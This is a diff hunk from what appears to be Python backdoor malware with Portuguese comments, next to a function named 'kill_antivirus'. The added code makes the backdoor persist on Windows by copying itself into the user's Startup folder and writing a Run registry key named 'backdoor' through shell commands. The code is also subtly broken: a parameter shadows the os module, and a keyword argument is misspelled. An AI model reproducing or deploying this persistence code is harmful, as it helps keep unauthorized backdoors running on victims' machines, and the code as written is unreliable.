@@ -46,7 +46,13 @@ def kill_antivirus():
 # persistencia -> mesmo depois de reiniciar o virus continua rodando
 def persistencia(os):
     if(os == 'nt'):
-        if(not os.getcwd() == TEMPDIR):
+        usuario = os.path.expanduser('~')
+        diretorio = '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+        caminho = usuario + diretorio
+        if(os.path.isdir(caminho)): # copia o backdoor para diretorio startup
+            subprocess.Popen('copy ' + nome_arquivo + ' ' + caminho, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
+
+        if(not os.getcwd() == TEMPDIR): # salva backdoor no registro
             subprocess.Popen('copy ' + nome_arquivo + ' ' + TEMPDIR, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
             FNULL = open(os.devnull,'w')
             subprocess.Popen("REG ADD HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ /v backdoor /d " + TEMPDIR + "\\" + nome_arquivo, stdout=FNULL, sderr=FNULL)
